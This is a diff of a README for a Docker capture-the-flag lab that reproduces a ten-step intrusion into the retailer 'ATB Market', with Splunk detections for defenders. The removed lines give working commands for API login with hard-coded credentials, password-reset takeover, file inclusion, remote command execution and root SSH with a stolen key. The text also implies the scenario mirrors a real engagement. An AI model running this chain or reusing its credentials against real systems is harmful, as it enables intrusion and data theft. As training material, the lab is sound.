@@ -1,120 +1,118 @@
-# ATB Market — Attack-Chain Lab
+# ATB Market — CTF
 
-A self-contained Docker lab that reproduces a 10-step red-team kill-chain
-end-to-end, with Splunk ingesting telemetry from every stage.
+A self-contained Docker CTF that reproduces a 10-step red-team kill-chain against
+a fictional retailer, "ATB Market". You start at the **perimeter** — a handful of
+public web apps — and have to work inward: pop a shell, pivot across the internal
+network, loot credentials and escalate until you reach source control. A Splunk
+instance watches every host, so the same lab doubles as a blue-team exercise.
 
 **Lab only.** Every host, credential and vulnerability here is fictional and
 deliberately insecure. Run it on an isolated machine and never expose the ports.
 
+## Rules of the game
+
+- **You only get the perimeter.** With a normal start, the only things published
+  on your host are the public web apps and Splunk (see table below). Everything
+  else — Grafana, Zabbix, Harbor, Jenkins, the databases, the SSH hosts — lives
+  on an internal Docker network. To touch them you must first get a foothold and
+  pivot from inside, exactly like the real engagement.
+- **The web is clickable.** Every web app is a real, navigable site — log in,
+  click around, follow the links. You drive the HTTP/SQLi/LFI steps from your
+  browser or your tooling; the non-web steps (ZBXD, SSH, Oracle, raw DBs) you run
+  from the shell you land after the web-shell step.
+- **Objectives = the 10 steps** below. There are no flag strings; you've done a
+  step when you've achieved the described access.
+
 ## Requirements
 
-Linux / WSL2 / macOS with Docker Engine >= 24 and compose v2, ~8 GB free RAM
-(Splunk wants ~2 GB), ~6 GB disk, and `make` / `bash` / `curl` / `python3` / `ssh`.
+Linux / WSL2 / macOS with Docker Engine ≥ 24 and compose v2, ~8 GB RAM
+(Splunk wants ~2 GB), ~6 GB disk, `make` / `bash` / `curl` / `ssh`.
 
-## Get it running
+## Start it
 
 ```bash
-git clone https://github.com/some60dy/atb-lab.git
-cd atb-lab
-make up        # bootstrap keys -> build -> start 19 containers (first run pulls Splunk ~2.5 GB)
-make ps        # wait until all are "running" (~60-90 s for DB seed + Splunk)
-make chain     # run the whole attack chain
-make down      # stop        make reset = stop + wipe volumes & logs
+make up        # bootstrap keys -> build -> start the lab (first run pulls Splunk ~2.5 GB)
+make ps        # wait until everything is "running" (~60-90 s for DB seed + Splunk)
+make down      # stop         make reset = stop + wipe volumes & logs
 ```
 
-The first credential is not in this repo. The mobile API login that unlocks
-step 1 is, in reality, extracted from the ATB Android APK (decompile
-`assets/index.android.bundle` with [hermes-dec](https://github.com/P1sec/hermes-dec)).
-The `mobapp` service just accepts it so the chain is reproducible without the APK.
-Full walkthrough: [docs/apk-recon.md](docs/apk-recon.md).
+## Your entry points (perimeter)
 
-## Service links
-
-| Service | URL | Notes |
+| Service | URL | What it is |
 |---|---|---|
-| Shop (Yii2) | http://localhost:8080 | SQLi target |
-| mobapp API | http://localhost:8081 | hard-coded Basic creds |
-| education (Moodle) | http://localhost:8082 | config leak |
-| supplier (SuiteCRM) | http://localhost:8083 | LFI + phar webshell |
-| zabbix | http://localhost:8084 | `api_jsonrpc.php` |
-| harbor | http://localhost:8085 | registry, leaked creds |
-| ad-ldap | http://localhost:8386 | directory mock |
-| grafana | http://localhost:3000 | reused creds |
-| exchange (EWS) | http://localhost:8444 | `/ews/Exchange.asmx` |
-| Splunk | http://localhost:8000 | admin / changeme |
+| ATB shop (Yii2) | http://localhost:8080 | online supermarket |
+| Mobile app API | http://localhost:8081 | registration API + APK download |
+| Staff LMS (Moodle) | http://localhost:8082 | employee e-learning |
+| Supplier portal (SuiteCRM) | http://localhost:8083 | B2B supplier CRM |
+| Corporate webmail (OWA) | http://localhost:8444 | Exchange / Outlook Web |
+| Splunk (blue team) | http://localhost:8000 | SIEM — `admin` / `changeme` |
 
-Non-HTTP: jenkins ZBXD `tcp/10050`, oracle `1581/1521/1251`, squid `3128`,
-bastion ssh `2210`, gitlab ssh `2222`, mysql `3306/3307/3308`, postgres `5432`.
+Yes, Splunk really is `admin:changeme`. That's not a challenge step — it's a wink
+at the original infrastructure, where it was exactly that. Use it to watch
+yourself (and to build detections): index `atb`.
 
-## Steps
+Everything else (Grafana, Zabbix, Harbor `sh-harb-p01`, Jenkins ZBXD, Oracle,
+MySQL/Postgres, the bastion and GitLab) is **internal** — no host port. You reach
+it by name (`grafana.atbmarket.com`, `zb-app-p01`, `harbor.atbmarket.com`,
+`jenkins.atbmarket.com`, `bastion-main-p01`, `gitlab-p01`, …) once you're inside.
 
-Run every command from the repo root. URLs with `filter[...]` need `curl -g`.
+## The 10 objectives
 
-**1. Recon** — hard-coded API creds + unauthenticated Moodle config leak
-```bash
-curl -s -u 'reg_user:basic*88password!prod99' -H 'Content-Type: application/json' -d '{"phoneNumber":"+380000000000"}' http://localhost:8081/register/login
-curl -s -X POST http://localhost:8082/md/blocks/moco_news/ajax.php --data 'procedure=getPosts'
-```
+1. **Recon.** Pull the mobile app from the API host and recover the hard-coded API
+   credentials baked into its JS bundle. Separately, find the staff LMS endpoint
+   that leaks its configuration (DB creds, a reused service account, the salt).
+2. **SQL injection.** The shop's catalog filter has an injectable array **key**
+   (`filter[8][<here>]`) — a boolean 200/500 oracle. Dump the customer DB.
+3. **Supplier foothold.** Self-register on the supplier portal and abuse its
+   password-reset to take over an account.
+4. **LFI.** As a supplier user, read arbitrary server files through the Import
+   mapping feature — pull the portal's config and the secrets inside it.
+5. **Web-shell.** Upload a phar/PNG polyglot that slips past the WAF's 180 KB scan
+   window and get code execution. **This is your foothold on the internal
+   network** — pivot from here (the box has DB/SSH/`nc`/python clients).
+6. **Escalate: Grafana → Zabbix → root.** Reuse a looted credential to log into
+   Grafana, run SQL through its over-privileged data source to forge an admin
+   session in the Zabbix DB, then use the Zabbix UI to run a script — as **root**.
+7. **Keys to everything.** From Zabbix, reach the Jenkins host's monitoring agent
+   (ZBXD `system.run`), read the CIFS backup it can see, recover `id_rsa_root` and
+   SSH into the bastion as root.
+8. **Databases.** With the keys and creds you've gathered, hit the Oracle
+   instances, the Harbor registry (creds baked into image layers), Active
+   Directory and the raw MySQL/Postgres.
+9. **Mail.** Decrypt the supplier mailbox password and read corporate webmail —
+   the inbox is full of live password-reset links.
+10. **Source.** SSH into GitLab as root and confirm you own all 524 repositories.
 
-**2. SQL injection** — boolean-blind on the catalog filter key
-```bash
-python3 attack/sqli_oracle.py http://localhost:8080
-```
+Hints live *in the world*: footers, config comments, the Zabbix host list, the
+bastion's shell history. Follow them.
 
-**3. Supplier portal** — self-registration + password reset
-```bash
-curl -s 'http://localhost:8083/index.php?entryPoint=RegistrationStep3' --data 'user_name=b9atbsup01@guerrillamailblock.com'; G=$(curl -s 'http://localhost:8083/index.php?entryPoint=GeneratePassword' --data 'user_name=b9atbsup01@guerrillamailblock.com&link=1' | grep -oE '[0-9a-f-]{36}' | head -1); curl -s "http://localhost:8083/index.php?entryPoint=Changenewpassword&guid=$G" --data 'password1=AtbB9Sup2026x!&password2=AtbB9Sup2026x!'
-```
+## Blue team (Splunk)
 
-**4. LFI** — read arbitrary files via Import mapping
-```bash
-curl -s 'http://localhost:8083/index.php?module=Import&action=RefreshMapping&to_pdf=true' --data 'importFile=/var/www/config_override.php' | sed 's/<[^>]*>/ /g'
-```
+Every container ships structured JSON to Splunk (index `atb`). Whole-chain view:
 
-**5. Web-shell** — phar polyglot, 180 KB WAF bypass
-```bash
-python3 attack/upload_phar.py http://localhost:8083
-```
-
-**6. Privilege escalation** — Grafana to forged Zabbix session to root RCE
-```bash
-python3 attack/forge_zabbix_session.py http://localhost:3000 http://localhost:8084 'id; hostname'
-```
-
-**7. Keys to everything** — ZBXD on Jenkins, pull backup key, SSH
-```bash
-python3 attack/zbxd_run.py 'cat /mnt/BACKUP/root.tar.gz | base64' localhost 10050 | tr -d '\n' | base64 -d > /tmp/atb_root.tar.gz; tar -xzf /tmp/atb_root.tar.gz -C /tmp; chmod 600 /tmp/root/.ssh/id_rsa_root; ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root/.ssh/id_rsa_root -p 2210 root@localhost 'id; hostname'
-```
-
-**8. Databases** — Oracle probes, Harbor-leaked creds, AD bind, direct DB
-```bash
-python3 attack/oracle_probe.py localhost 1581 XX_SUP_PORTAL_RO S0h6jWot2fTLSMm
-curl -s http://localhost:8085/image/ishop/api/env
-mysql -h127.0.0.1 -P3306 -uishop -p'rEQaZ55o7x_E53oC' ishop -e 'SELECT COUNT(*) FROM users;'
-```
-
-**9. Mail** — Exchange EWS with stolen mailbox creds
-```bash
-curl -s -u 'supplier@atbmarket.com:supplier123569' -H 'Content-Type: text/xml' --data @attack/ews_finditem.xml http://localhost:8444/ews/Exchange.asmx | grep -oE 'TotalItemsInView="[0-9]+"'
-```
-
-**10. Source code** — root SSH to GitLab (524 repos)
-```bash
-ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/root/.ssh/id_rsa_root -p 2222 root@localhost 'find /var/opt/gitlab/git-data/repositories -name "*.git" | wc -l; hostname'
-```
-
-## Detection (Splunk)
-
-http://localhost:8000 (admin / changeme), index `atb`:
 ```spl
 index=atb | sort 0 _time | table _time host service event src_ip msg
 ```
 
+Per-stage correlation searches ship in the `atb_inputs` app (`ATB …`); the SPL for
+each step is in [`splunk/detections.md`](splunk/detections.md).
+
+## For organizers
+
+- `make up-dev` additionally exposes every internal service on a host port (for
+  debugging / building detections) — see [`docker-compose.dev.yml`](docker-compose.dev.yml).
+  **Never give players this.**
+- `make solve` runs [`attack/solve.py`](attack/solve.py), the reference solver that
+  drives all 10 steps and prints PASS/FAIL. It requires `make up-dev`.
+- Full walk-through and exact values: [`docs/ctf-design.md`](docs/ctf-design.md)
+  and [`SOLUTIONS.md`](SOLUTIONS.md) (spoilers).
+
 ## Docs
 
-- [docs/attack-chain.md](docs/attack-chain.md) — every step in detail
+- [docs/ctf-design.md](docs/ctf-design.md) — topology, breadcrumbs, fixed values (spoilers)
+- [docs/attack-chain.md](docs/attack-chain.md) — each step in detail
 - [docs/asset-inventory.md](docs/asset-inventory.md) — hosts, credentials, databases
-- [docs/apk-recon.md](docs/apk-recon.md) — extracting step 1's credential from the real APK
+- [docs/apk-recon.md](docs/apk-recon.md) — extracting step 1's credential from the APK
 - [docs/network.md](docs/network.md) — network notes
 - [splunk/detections.md](splunk/detections.md) — SPL per stage
-- [DEPLOY.md](DEPLOY.md) — deployment guide
+- [DEPLOY.md](DEPLOY.md) — deployment / troubleshooting
